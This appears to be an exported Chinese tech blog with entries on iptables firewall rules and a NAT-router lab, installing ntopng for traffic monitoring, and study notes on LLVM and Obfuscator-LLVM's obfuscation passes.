ESTABLISHED -j ACCEPT# 20. 允许 Sendmail 或 Postfix$ iptables -A INPUT -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT# 21. 允许 IMAP 和 IMAPS$ iptables -A INPUT -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT$ iptables -A INPUT -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT# 22. 允许 POP3 和 POP3S$ iptables -A INPUT -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT$ iptables -A INPUT -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT# 23. 防止 DoS 攻击$ iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT# 24. 设置 422 端口转发到 22 端口$ iptables -t nat -A PREROUTING -p tcp -d 192.168.102.37 --dport 422 -j DNAT --to 192.168.102.37:22$ iptables -A INPUT -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT$ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT# 25. 为丢弃的包做日志（Log）$ iptables -N LOGGING$ iptables -A INPUT -j LOGGING$ iptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix "IPTables Packet Dropped: " --log-level 7$ iptables -A LOGGING -j DROP iptables防火墙规则的保存与恢复iptables-save把规则保存到文件中，再由目录rc.d下的脚本（/etc/rc.d/init.d/iptables）自动装载，使用命令iptables-save来保存规则。 一般用iptables-save &gt; /etc/sysconfig/iptables 生成保存规则的文件/etc/sysconfig/iptables，也可以用service iptables save它能把规则自动保存在/etc/sysconfig/iptables中。 当计算机启动时，rc.d下的脚本将用命令iptables-restore调用这个文件，从而就自动恢复了规则。 iptables的简单应用由于网络安全课程的实验，特地来学习iptables，可以把实验当作一个应用示例 实验大致如下： 一台windows虚拟机，内网环境，无法直接访问外网 一台linux虚拟机，两个网卡，一个用于连接外网，一个用于连接内网(即windows虚拟机) 目标：利用iptables将linux配置成路由器，windows虚拟机通过路由器访问Internet 实验环境：Ubuntu 18.04和windows server2016 刚开始认为创建网卡，便在虚拟机的ubuntu里创建了一个虚拟网卡，后面才发现不对，构建不了内网环境，之后才发现是在vmware中添加物理网卡(模拟的)构建内网环境。 所以首先为ubuntu创建两个网卡，一个能访问外网(使用NAT)，另外一个仅内网(vmware里的仅主机，LAN那个我没搞懂，应该也是可以的) 在linux中，用命令sudo vim /etc/network/interfaces修改网卡配置如下： 1234567891011121314# interfaces(5) file used by ifup(8) and if down(8)auto loiface lo inet loopbackauto ens33iface ens33 inet staticaddress 192.168.52.128netmask 255.255.255.0gateway 192.168.52.1auto ens38iface ens38 inet staticaddress 172.16.0.10netmask 255.255.255.0 修改后，重启网络配置 123sc@sc-virtual-machine:~$ sudo /etc/init.d/networking restart[ ok ] Restarting networking (via systemctl): networking.service.sc@sc-virtual-machine:~$ 还有一点，要开启linux的ip转发功能，命令如下： 12345root@sc-virtual-machine:/home/sc# echo 1 &gt; /proc/sys/net/ipv4/ip_forward$ sudo vim /etc/sysctl.conf# net.ipv4.ip_forward = 1# 取消上面这个注释,开启linux转发sc@sc-virtual-machine:~$ sudo sysctl -p 在sysctl.conf里，本来就有注释的转发配置语句，取消注释即可，用命令重新加载内核参数，当然，此时重启linux虚拟机也不是不可以 在windows做如下配置 控制面板-&gt;网络和Internet-&gt;网络和共享中心-&gt;本地连接-&gt;属性-&gt;Internet协议版本4（TCP/IPv4）-&gt;属性 特别地，要将windows网关配置为linux的内网网卡地址 然后要记得，DNS服务器要和linux主机的一致 假如，windows虚拟机能ping通linux主机，但是linux主机ping不通windows，则需要关闭windows的防火墙，或者在windows防火墙中，在入站规则内打开ICMP回显 控制面板-&gt;系统和安全-&gt;Windows防火墙-&gt;高级设置-&gt;入站规则-&gt;文件和打印机共享（回显请求-ICMPv4-In）-&gt;右键-&gt;启用规则 iptables转发用iptables做nat，命令如下 123sc@sc-virtual-machine:~$ # sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADEsc@sc-virtual-machine:~$ sudo iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -o ens33 -j MASQUERADEsc@sc-virtual-machine:~$ sudo iptables -A FORWARD -i ens38 -j ACCEPT 将来自172.16.0.0/24内网的流量转发到ens33，MASQUERADE是指用该网卡上的IP来替换源地址IP，对于IP不固定，如dhcp自动分配ip的情况下使用，这边由于是静态ip，不加该选项也是可以的 运行完命令后，在windows主机就可以ping通baidu.com了，实验就完成了]]></content>
      <categories>
        <category>linux</category>
        <category>Network</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ntop]]></title>
    <url>%2F2020%2F03%2F06%2FNtop%2F</url>
    <content type="text"><![CDATA[Ntop 参考： Github-ntop Github-ntop/ntopng Ntopng Ntopng-userguide 运用Ntop监控网络流量 Ntop是一种监控网络流量的工具，而Ntopng是基于web的高速流量分析和流收集工具，是ntop的下一代，ntopng基于libpcap，并且以可移植的方式编写 Ntop的功能： 自动从网络中识别有用的信息； 将截获的数据包转换成易于识别的格式； 对网络环境中通信失败的情况进行分析； 探测网络环境中的通信瓶颈,记录网络通信的时间和过程。 使用我在ubuntu18.04上装ntopng，linux就是这么简单，一行命令解决 1$ sudo apt-get install ntopng 运行示例如下，运行后访问 http://localhost:3000 进入后要先注册，默认admin/admin，强制改密码，需要5位数，我改成了admin/12345 以下是所有主机 这是其主页，ens33是桥接外网的网卡 流量监控如下 针对某个流量的监控：我主机和虚拟机相互ping]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>Ntop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ollvm-learning]]></title>
    <url>%2F2020%2F02%2F27%2Follvm-learning%2F</url>
    <content type="text"><![CDATA[llvm 参考： LLVM官网 LLVM-docs ：注意要查看对应版本的文档，每个版本文档都有所改变 Github-llvm/llvm-project Github-llvm-mirror/llvm LLVM基础(IR简介&amp;CFG图生成&amp;可视化)：可以生成可视化的IR流程图 参考的GitHub Github-heroims/obfuscator ：移植好的ollvm9.0等 OLLVM代码混淆移植与使用 ：heroims的博客 Github-iamywang/obfuscator Github-HikariObfuscator/Hikari Github-GoSSIP-SJTU/Armariris Github-obfuscator-llvm/obfuscator ：官方版本 obfuscator-wiki pediy.com—[原创]ollvm快速学习 llvm入门 OLLVM代码混淆移植与使用 llvm学习（三）：移植ollvm等作品到单独编译的Pass 蓝色的味道：谁说不能与龙一起跳舞：Clang / LLVM OLLVM代码混淆移植与使用 llvm入门笔记 llvm编译流程 LLVM学习总结与OLLVM项目分析 Obfuscator-llvm源码分析 ollvm源码分析 [原创]ollvm源码分析 - Pass之Flattening [原创]ollvm源码分析 - Pass之SplitBaiscBlocks GoSSIP安全研究项目：孤挺花（Armariris） LLVM混淆框架 为OLLVM添加字符串混淆功能 llvm之旅第四站 － 编写Pass Github-haidragon / study_obscure [原创]Fllvm（Fuck-ollvm）介绍 啥是LLVM？ [原创]LLVM了解篇剧场版 以上这篇文章简要地介绍了LLVM LLVM：Low Level Virtual Machine(最初) 官方定义：LLVM是一个模块化和可重用的编译器和工具链技术的集合 LLVM最初是在2000年由伊利诺伊大学香槟分校(UUIC)的学生Chris Lattner及其硕士顾问Vikram Adve创建的研究项目，并在2003年发布第一个正式版本，目的是提供一种基于SSA的现代编译策略，这种策略能够支持任何编程语言的静态和动态编译。 有意思的是，他的作者原本想要写一个低层虚拟机的，然而他并没有被当成虚拟机来用，逐渐地偏离了他原本的方向。现在llvm不是任何单词的缩写，而是一种体系，包含了一系列的项目 对于LLVM核心（LLVM Core）来说，它是一个编译器基础设施框架，它包含了为我们编写编译器一系列的库（如程序分析、代码优化、机器代码生成等），并且提供了调用这些库的相关工具，如llvm-opt可以调用LLVM优化相关的库，llvm-mc可以调用LLVM机器代码生成相关的库。并为此提供了一个非常方便简单、具备类型的、平台无关的统一中间代码语言，称之为LLVM IR. 以上是一个正常编译器的流程，源代码经过前端编译成中间代码，在经过优化和后端生成相应的机器码，即可执行文件 LLVM编译一个源文件的过程：预处理 -&gt; 词法分析 -&gt; Token -&gt; 语法分析 -&gt; AST -&gt; 代码生成 -&gt; LLVM IR -&gt; 优化 -&gt; 生成汇编代码 -&gt; Link -&gt; 目标文件 其中IR(intermediate representation)是前端语言生成的中间代码表示，也是Pass操作的对象，它主要包含四个部分： （1）Module：比如一个.c或者.cpp文件。 （2）Function：代表文件中的一个函数。 （3）BasicBlock：每个函数会被划分为一些block，它的划分标准是：一个block只有一个入口和一个出口。 （4）Instruction：具体的指令。 IR中各部分的具体关系如下图： 拿个例子来说就是：首先，我们有C代码程序文件，然后经过了Clang前端（或者古老的llvm-gcc前端，这是在Clang出现以前使用的前端，可以产生LLVM IR），然后会产生LLVM IR。在这里，我们可以发现LLVM IR是以.bc结尾，缩写代表的单词是bitcode，它是序列化的数据，用以存储在磁盘中。而LLVM IR非常牛逼的创建了三种LLVM IR表示格式，除了bitcode这种用以存储的格式，第二种是用于人类可读的的格式，一般以.ll结尾。 1$ clang a.c -S -emit-llvm# 生成.ll可读文件 这条命令即可产生.ll文件 而第三种格式则是内存表示格式，这一般是用于我们程序开发，去操作LLVM IR。那么这里面有一个宏观的概念，那就是一个编译单元（即一个.c文件），在LLVM IR中代表着一个Module，而一个Module里面含有Global Value，主要包括Global Variable 和 Function，而至于Global Alias大家接触比较少，我们暂时忽略。而一个Function里面包含着Basic Block，而一个 Basic Block里面包含着指令，如add。那么关系你可以认为是Module -&gt; Function -&gt; Basic Block -&gt; Instructions. 这是一个宏观的认识，需要具备。而这一个也就是我们常常去查阅的相关LLVM IR的API，如：llvm-GlobeValue 而这里明确的一点是，这三者是完全等价的，并且可以转换的 再回到上面的流程图，即产生.bc的阶段。产生完毕后，它这里直接进入llvm-link阶段，其实不太完整。若是我们使用了O2等优化，我们在这里还会经历一个优化的阶段，即对这一个编译单元的优化，大约包括了40多种优化Pass，如死代码消除，内联等。而经过优化后，依然是.bc文件，然后再进入llvm-link阶段。而在llvm-link阶段，所要做的其实就是把多个.bc文件合并成一个.bc文件，并且做链接时优化，在这篇文章中提到过一个例子：LLVM Link Time Optimization，可以查阅一下是如何进行链接时优化的。 而经过llvm-link阶段后，我们得到了一个新的.bc文件，那么我们会再次进入优化阶段，重新再进行一次优化。因为经过llvm-link后，我们的IR结构可能发生了一些变化，从而可能更有利于我们优化，得到更优化的IR。而这一步骤后，可以得到最终优化后的.bc，正式进入代码生成阶段。 而在这一幅图中，只列举出来了一个llc，即走机器代码生成的路径。其实对于LLVM来说，还可以有一个过程，那就是lli，即解释执行LLVM IR。不过我们这里不多谈，我们重点在机器代码生成。那么llc的作用就是把LLVM IR 编译成汇编文件.s，这里你可以把LLVM IR想象成一个编程语言，然后经过了llc编译器，最后产生了汇编文件。如同C程序，经过Clang，产生了LLVM IR一般。那么，产生了汇编文件以后，就可以调用系统的汇编器，如GNU的as，从而产生目标文件object file，即.o文件了。而细心的童鞋可能注意到了这里还有一条路径是llvm-mc，直接走生成object file的过程。而这条路径在如今来说，并不是每个平台都会走，核心在于LLVM本身的集成汇编器，即-fintegrated-as，使用集成汇编器既可以使用MCLoweing到MCInst，再使用MCStreamers直接到.o，当然也可以到.s。而目前本身的集成汇编器，我认为是并非完美，但是以发展趋势来看，会大一统的，从而做到没有平台差异，这也是LLVM做集成汇编器的一大理由。而生成完.o文件，剩下的过程就很简单了，就是链接器链接相关的库，然后和目标文件一起生存可执行文件.out / .exe了。 12345# 二进制代码形式$ clang -emit-llvm -c main.c -o main.bc# 可读文本代码形式$ clang -emit-llvm –S -c main.c -o main.ll llvm 和 clang 的关系 对于 LLVM 来说，其前端是 clang，在编译源码文件的时候使用的编译工具也是 clang。而生成中间 IR 代码后，llvm需要对 IR 代码进行一些操作，例如添加一些代码混淆功能。LLVM 的做法是通过编写 Pass(其实就是对应的一个个模块，每个类实现不同的功能)来实现混淆的功能。所以实现混淆，其实就是编写功能性的 Pass Obfuscator-LLVMObfuscator-LLVM是由瑞士伊夫尔东莱班的应用科学与艺术大学信息安全小组（HEIG-VD）于2010年6月发起的一个项目。 该项目的目的是提供LLVM编译套件的开源分支，该套件能够通过代码混淆)和防篡改来提高软件安全性。由于我们目前大部分工作在中间表示（IR）级别，因此我们的工具与所有编程语言（C，C ++，Objective-C，Ada和Fortran）和目标平台（x86，x86-64，PowerPC，PowerPC-64）兼容。 LLVM当前支持的ARM，Thumb，SPARC，Alpha，CellSPU，MIPS，MSP430，SystemZ和XCore）。 Obfuscator-LLVM的目的主要是在编译时增强软件就对抗向工程和编译时修改（动态调试？） Install可以直接从github上下载源码 123456$ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build$ cd build# 如果不想跑测试用例加上-DLLVM_INCLUDE_TESTS=OFF $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/$ make -j7 然而我在4核4G虚拟机里编译将近2h，还报错了tcl 我现在只想再来几根内存条 :( 123456error:virtual memory exhausted:Cannot allocate memory$ make -j7 &gt;&gt;40%$ make -j4 &gt;&gt;95%$ make -j2 &gt;&gt;100% o-llvm手动打包 http://www.few.vu.nl/~lsc300/LLVM/doxygen/index.html API Document 因为我下的ollvm9.0的-fla有bug，所以决定亲自打包一波，顺便再深入了解ollvm 由Diffinity将ollvm4.0和llvm4.0进行对比，发现了以下文件的不同，也就意味着我们将ollvm打包进最新的llvm也需要修改以下文件。 123456789101112./include/llvm/Transforms/Obfuscation/ # obfuscation的头文件./include/llvm/Transforms/CryptoUtils.h # obfuscation的头文件./lib/Transforms/IPO/LLVMBuild.txt./lib/Transforms/IPO/PassManagerBuilder.cpp # Pass注册./lib/Transforms/Obfuscation/ # obfuscation source code./lib/Transforms/CMakeLists.txt./lib/Transforms/LLVMBuild.txt./tools/clang # 集成clang,要在gitignore里取消clang的注释./.gitignore./CMakeLists.txt./CODE_OWNERS.TXT./LICENSE.TXT 从自己的github的obfuscator仓库中clone下来，注意一定要clone，直接下载downloadzip没有.git信息，虽然他真的很慢。 然后创建自己的llvm9.0分支 1234567891011121314151617181920212223242526272829303132333435363738394041$ git clone git@github.com:Magic-King/obfuscator.gitCloning into 'obfuscator'...remote: Enumerating objects: 86723, done.remote: Total 86723 (delta 0), reused 0 (delta 0), pack-reused 86723Receiving objects: 100% (86723/86723), 132.79 MiB | 35.00 KiB/s, done.Resolving deltas: 100% (15346/15346), done.$ git branch -a* master remotes/origin/HEAD -&gt; origin/master remotes/origin/clang-425.0.24 remotes/origin/llvm-3.3 remotes/origin/llvm-3.4 remotes/origin/llvm-3.5 remotes/origin/llvm-3.6.1 remotes/origin/llvm-4.0 remotes/origin/master$ git branch -r origin/HEAD -&gt; origin/master origin/clang-425.0.24 origin/llvm-3.3 origin/llvm-3.4 origin/llvm-3.5 origin/llvm-3.6.1 origin/llvm-4.0 origin/master$ git remote add origin git@github.com:Magic-King/obfuscator.gitfatal: remote origin already exists.$ git checkout -b llvm-9.0Switched to a new branch 'llvm-9.0$ git push origin llvm-9.0Total 0 (delta 0), reused 0 (delta 0)remote:remote: Create a pull request for 'llvm-9.0' on GitHub by visiting:remote: https://github.com/Magic-King/obfuscator/pull/new/llvm-9.0remote:To github.com:Magic-King/obfuscator.git * [new branch] llvm-9.0 -&gt; llvm-9.0 然后把最新的llvm9.0.1放入obfuscator/文件夹下，把clang放入 obfuscator/tools/clang里 然后将obfuscator-llvm4.0移植到obfuscate里，具体可以查看我的github的commit记录 网址如下：https://github.com/Magic-King/obfuscator/commits/llvm-9.0 但是，手动打包之后，-fla还是有问题，不过其他选项倒是没问题，应该是-fla和llvm-9.0不兼容的问题 o-llvm的特点 nstructions Substitution -mllvm -sub：指令替换 Bogus Control Flow -mllvm -bcf：伪控制流 Control Flow Flattening -mllvm -fla：激活控制流扁平化 Functions annotations：可以针对一些特定函数进行混淆（选择性混淆） nstructions Substitution这种混淆技术的目标仅在于用功能上等效但更复杂的指令序列代替标准的二进制运算符（如加，减或布尔运算符）。当几个等效的指令序列可用时，随机选择一个。 这种混淆非常简单，并且不会增加很多安全性，因为可以通过重新优化生成的代码轻松地将其删除。但是，如果伪随机数发生器使用不同的值作为种子，则指令替换会在生成的二进制文件中带来多样性。 当前，只有整数运算符可用，因为用浮点值替代运算符会带来舍入误差和不必要的数值误差。 可用的编译器选项： -mllvm -sub：激活指令替换 -mllvm -sub_loop=3：如果激活了通行证，则将其应用到功能上3次。默认值：1。 wiki中提到了可替换的运算：add、sub、and、or、xor。 Bogus Control Flow该方法通过在当前基本块之前添加一个基本块来修改函数调用图。这个新的基本块包含一个不透明的谓词，然后有条件地跳转到原始的基本块。 原始的基本块也将被克隆并填充以随机选择的垃圾指令。 可用的编译器选项： -mllvm -bcf：激活伪控制流程 -mllvm -bcf_loop=3：如果激活了通行证，则将其应用到功能上3次。默认值：1 -mllvm -bcf_prob=40：如果激活了通行证，则基本团块将以40％的概率被混淆。默认值：30 Control Flow Flattening此过程的目的是完全弄平程序的控制流程图。简单来说就是拆分基本块并置于无限循环中，程序流程由switch控制 可用的编译器选项： -mllvm -fla：激活控制流展平 -mllvm -split：激活基本块分割。一起使用可改善展平性。 -mllvm -split_num=3：如果激活了通行证，则在每个基本块上应用3次。默认值：1 Functions annotations注释使您可以按功能指定要应用（或不应用）混淆的功能 用法：只需向您的函数添加属性。 例如： 1234int foo() __attribute((__annotate__(("fla"))));int foo() &#123; return 2;&#125; 您可以为每个功能添加使用一个或多个注释。如果要禁用功能的混淆，也可以使用“反向标志”（例如，如果要禁用功能的伪造控制流，请使用注释“ nobcf”）。 对比我自己写了一个测试文件，然后用于clang和ollvm混淆的各种测试 源代码如下，关于混淆之后的执行文件和源文件打包在了here 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;4printf("Hello LLVM");4char *a= "Hello fucking bug";4//a = "Hello O-LLVM!I will fuck you!";4int sum = 0;4for (int i = 1;i&lt;=10;i++)&#123;44sum += i;4&#125;4printf("%s\nthe answer of what i do is %d\n",a,sum);4printf("test finished!\n");4return 0;&#125; 以下是gcc编译的文件通过ida逆向所得的流程图 以下是用clang9.0 编译test的流程图，可见大体的流程是和gcc相同的，不过通过ida的万能F5反编译出来的源码，clang版本的基本和源码差不多，gcc版本的循环的变量挺奇怪的，但是总体流程还是不变的 下图是加了ollvm的bcf选项的反汇编结果，可见添加了许多虚假控制流，真正执行的循环是左半部分，他把for循环结束之后的该执行的语句放到了右半部分，在添加虚假控制流 看反汇编的代码，他把for循环放入了一个while循环里，然后用一个if控制是否结束原来的循环，加入结束，就用goto到达最后执行的语句里，这里又写了一个假的while，经我看下来，这个while也就执行一次，循环就退出了，果然混淆后想搞懂流程贼麻烦 ollvm编译fla选项，由于适配llvm9.0的fla选项失败了，所以这边是引用-split选项得出来的反汇编结果，split也就是fla平坦化所选择的选项 对比原来的clang反汇编出来的结果是不是多了许多可供选择的路，正如wiki所说是用switch控制的 反汇编出来的代码嵌套了多层while循环，并加入if判断，低层应该就是用switch实现的，然后再某几个switch case加入break破坏循环达到控制流程的目的 这个是最简单的，和clang编译的版本对比，主要区别在于分块之后的左边的块，他把其指令进行了替换，具体咋替换看我后面的源码分析 不过可惜的是，这个代码替换对于ida来说好像不是什么大事情，利用万能的F5反汇编时，他成功把循环里的加法还原了，产生的代码和clang版本没混淆的一模一样 可能这需要和其他几个选项一起使用会比较好 //TODO：字符串混淆 o-llvm源码分析通过我们手动将ollvm与llvm9.0打包的过程，我们可以非常清楚地了解了ollvm的源码结构 1234567./include/llvm/Transforms/Obfuscation/ # obfuscation的头文件./include/llvm/Transforms/CryptoUtils.h # obfuscation的加密工具类的头文件./lib/Transforms/IPO/LLVMBuild.txt # pass模块编译的模块注册./lib/Transforms/IPO/PassManagerBuilder.cpp # Pass注册./lib/Transforms/Obfuscation/ # obfuscation source code./lib/Transforms/CMakeLists.txt # 加入子目录./lib/Transforms/LLVMBuild.txt # 加入LLVM编译子目录 我们知道，ollvm就是通过编写llvm的pass来将其中间语言IR进行不同程度的混淆 Bogus Control FlowBogus Control Flow的功能是为函数增加新的虚假控制流和添加垃圾指令。 其中文件位于./include/llvm/Transforms/Obfuscation/BogusControlFlow.cpp 其中的注释跟我们非常形象的演示了其的工作内容 123456789101112131415161718192021222324252627282930// This file implements BogusControlFlow's pass, inserting bogus control flow.// It adds bogus flow to a given basic block this way://// Before :// entry// |// ______v______// | Original |// |_____________|// |// v// return//// After :// entry// |// ____v_____// |condition*| (false)// |__________|----+// (true)| |// | |// ______v______ |// +--&gt;| Original* | |// | |_____________| (true)// | (false)| !-----------&gt; return// | ______v______ |// | | Altered |&lt;--!// | |_____________|// |__________|// 他的Cpp文件先写好了Debug信息，再定义了以下为pass提供的选项常量 其中，我们最常见的 cl::opt&lt;data_type&gt;是用来传递llvm之间pass共享的参数，也就是我们在编译时所给的-bcf_prob = 50这个命令行编译参数可以传递到pass的核心所在 cl::opt这个用法让我想起了c++中std::cout、using namespace std，经查询发现，这是一个类似于python的import的一个语法，namespace是为了和c的.h区分开来 详细可见： C++ Namespace 详解 C++ 命名空间 C++/C++11中命名空间(namespace)的使用：这里面有一段折磨人的代码，读懂了应该就懂了c++的namespace的作用域 目前读下来，最常见的应该就是namespace llvm和 namespace cl了 1struct BogusControlFlow : public FunctionPass 这里，BogusControlFlow继承至FunctionPass，因此它的入口函数即为runOnFunction struct的继承和class的继承有很大的区别，struct的继承是基于子类(struct)的public继承，class是基于子类(class)的private继承 整个namespace写了一个struct 类用于混淆 其中runOnFunction为入口函数，先判断bcf的两个参数-bcf_loop和-bcf_prob是否符合正确范围内，然后检查是否启用了-bcf选项，假如启用了，则进入核心函数bogus(F);，然后继续处理doF(*F.getParent()); 在bogus()函数里，先实现了Debug的相关部分，在每次进入函数前输出debug信息，用于处理debug模式下的-bcf选项。然后定义一个list链表，用于储存BasicBlock，BasicBlock用for循环利用迭代器的模式从传入的 F 获取。一个while循环，当基本块非空时，利用cryptoutils工具类获取随机数，从链表中选择基本块进行混淆(用addBogusFlow(basicBlock, F);函数)，并标记已混淆过该块，防止重复混淆某一基本块，否则就不混淆。然后弹出链表中的第一块，这样直到混淆次数为0为止。 addBogusFlow()函数，将给定的基本块进行添加虚假控制流。首先获得一个基本块Basic Block，利用createAlteredBasicBlock()函数生成一个与原基本块相似的Basci Block，然后利用BasicBlock-&gt;getTerminator()-&gt;eraseFromParent();把他们的父母节点擦除，然后创建两个条件恒为真的左右子节点，然后将其创建分支循环。（其过程是创建一个恒真的分支，进入分支的基本块后，加入一个判断，若真进入原基本块，若假进入假基本块，经假基本块的垃圾代码之后，再进入原基本块。在为真时，进入原基本块，将基本块主体执行完之后，在加入分支判断，正确返回结果，错误跳转至混假基本块进行循环） https://sq.163yun.com/blog/article/175307579596922880：这个讲的特别形象，配合着图一起阅读，这边借用其一张图 123int add(int a, int b)&#123; return a+b;&#125; 如图，对于上述函数，分离其基本块，创建一个入口entry，然后加入一个恒真的分支，把生成相似的基本块放至错误分支里，即其永远不会执行的垃圾代码，将所执行的基本块放入正确分支里 createAlteredBasicBlock()函数用于生成与给定基本块相似的基本块，将操作运算符进行重新映射，重新映射节点，重新映射对应的数据，然后加入随机的指令 对于doF()函数，该函数的功能是将Function中所有为真的判断语句进行替换，比如之前的1.0 == 1.0。它的思想是定义两个全局变量x、y并且初始化为0，然后遍历Module内的所有指令，并将所有的FCMP_TRUE分支指令替换为y&lt;10 || x*x(x-1)%2 ==0，我们从反汇编的代码来看，很明显的就有y&lt;10这个分支 FlatteningFlattening的主要功能是为函数增加switch-case语句，使得函数变得扁平化。下面就对它的实现源码进行分析。 其中文件位于./include/llvm/Transforms/Obfuscation/Flattening.cpp Flattening继承了FunctionPass，因此它的入口函数即为runOnFunction。在runOnFunction函数的具体实现中，首先判断是否包含了启动-fla的命令。在编译目标程序代码时，如要启动fla模块，需要带上参数-mllvm -fla。 参数检查完毕之后，调用flatten函数。flatten函数是该Pass的核心，下面对该函数进行分析。 先是声明了一些后面要用的变量，然后创建了一个数组，用来存储随机数种子 1234567// SCRAMBLER char scrambling_key[16]; llvm::cryptoutils-&gt;get_bytes(scrambling_key, 16); // END OF SCRAMBLER // Lower switch FunctionPass *lower = createLowerSwitchPass(); lower-&gt;runOnFunction(*f); 后两行调用了外部一个外部pass：creatLowerSwitchPass()，用来消除当前函数的内部用switch方式的代码，将其全转换成if else的调用，方便后面的代码块分割 然后一个for循环，像bcf那样，将函数分为各个基本块储存在vector&lt;BasicBlock *&gt; origBB的一个向量数组里，等等的代码是针对基本块的操作，就像乐高那样一块块进行拼接。 然后的话，若只有一个以下的基本块，那么无法平坦化，直接返回false 然后开始遍历基本块，先把第一块从vector数组中移除，因为按照他的流程平坦化的设计，第一块进行单独处理，作为整个混淆流程的开始逻辑，所以紧接着先对第一块进行处理。 检查第一块中是否包含条件跳转分支，如果包含条件跳转分支，则按照条件分支的位置进行代码块分割，分割逻辑跟SplitBasicBlock的逻辑一致，整个分割的目的也是为了后面进行流程平坦化准备的 然后开始是核心代码了 1234567// Create switch variable and set as it switchVar = new AllocaInst(Type::getInt32Ty(f-&gt;getContext()), 0, "switchVar", insert); new StoreInst( ConstantInt::get(Type::getInt32Ty(f-&gt;getContext()), llvm::cryptoutils-&gt;scramble32(0, scrambling_key)), switchVar, insert); 这一段创建了一个switch用的变量，相当于是switch(caseVar)，并通过StoreInst进行赋值，这时就用上了之前的随机数种子，将生成的随机数用作case。 接着创建了两个空的基本块loopEntry和loopEnd，然后将switch语句放入loopEntry中，将第一块基本块连接上loopEntry，loopEnd跳转回loopEntry，在switch语句加入默认的swDefault基本块大概成型了 大概就和下面这个流程图差不多了 12345678910111213141516171819202122232425// +--------+// |first bb|// +---+----+// |// +----v----+// |loopEntry| &lt;--------+// +----+----+ |// | |// +----v---+ |// | switch | |// +----+---+ |// | |// +------------+ |// | |// +------v-------+ |// | default case | |// +------+-------+ |// | |// +-----------+ |// | |// | |// v |// +-----+------+ |// | loopEnd +---------+// +------------+ 骨架成型了，接下来把剩余的基本块往switch语句中填入就行了。 但是填入之后肯定是个死循环了，我们这时候就要活用flatten的思想，控制switch case的caseVar的值来达到控制流程的目的——很简单，在每个基本块即每个case之后，补上一条对caseVar的值更新的语句即可达到控制流程的目的 剩下代码就是来更新每个case中代码块对caseVar的操作了，怎么更新呢，很简单，就是更新成当前代码块原后续逻辑块在当前这个代码框架下的case值 接下来的操作分三种情况来进行 case中代码块没有后续块，那就是一个返回块，不需要更新caseVar case中代码块只有一个后续块，也就是一个无条件跳转分支，直接更新成后续块对应的case即可 case中代码块有2个后续块，也就是一个条件跳转分支，通过successor对象（就是后续块的意思）直接在switch结构中查找出对应的case值 1SelectInst *sel =SelectInst::Create(br-&gt;getCondition(), numCaseTrue, numCaseFalse, "",i-&gt;getTerminator()); 如上，使用llvm的SelectInst来实现分支选择，像227行写的，根据br-&gt;getCondition()是否为True来决定是跳转到numCaseTrue还是numCaseFalse 最后这样就成功平坦化成功了 拿一个例子来理解： 1234567891011int func1(int a,int b)&#123; int result; if(a&gt;0)&#123; result=a+b; &#125; else&#123; result=a-b; &#125; return result;&#125; 如下图，这是原本上面这个函数的IR图 先判断第一个基本块有没有if语句，我们这个函数刚开始明显没有，先将第一块分开成一个基本块 然后创建三个基本块loopEntry、loopEnd、swDefault，组成如下图左边的流程 这时候，switch语句我们已经可以看见了，接下来就是将vector里存储的每个基本块加入switch-case语句中，每一个basicblock对应一个case，并且caseVar为刚开始产生的随机数值，如下图所示 添加完全部基本块之后，需要修改每个基本块的跳转关系，使得每个基本块执行完毕之后，会重新设置caseVar的值，从而跳转到loopEnd块，然后回到switch-case的判断语句中，能够顺利跳转到下个case，处理后即为下图成型 SubstitutionSubstitution的主要功能是对程序的一些指令进行替换。 其中文件位于./include/llvm/Transforms/Obfuscation/substitution.cpp 12345678910111213141516171819202122#define NUMBER_ADD_SUBST 4#define NUMBER_SUB_SUBST 3#define NUMBER_AND_SUBST 2#define NUMBER_OR_SUBST 2#define NUMBER_XOR_SUBST 2static cl::opt&lt;int&gt;ObfTimes("sub_loop", cl::desc("Choose how many time the -sub pass loops on a function"), cl::value_desc("number of times"), cl::init(1), cl::Optional);// StatsSTATISTIC(Add, "Add substitued");STATISTIC(Sub, "Sub substitued");// STATISTIC(Mul, "Mul substitued");// STATISTIC(Div, "Div substitued");// STATISTIC(Rem, "Rem substitued");// STATISTIC(Shi, "Shift substitued");STATISTIC(And, "And substitued");STATISTIC(Or, "Or substitued");STATISTIC(Xor, "Xor substitued"); 如上代码，通过该文件的宏定义，就可知每种运算替换的方式有多少种，可以对哪些指令进行替换：很明显的有：加减、位的与、或、异或，五种运算的替换 而注释的是未实现的运算替换，在官方wiki里可以知道，为了保证混淆再恢复之后的正确性，避免浮点数运算带来的程序误差，所以没有实现这些运算的替换（乘、除、取余，移位） 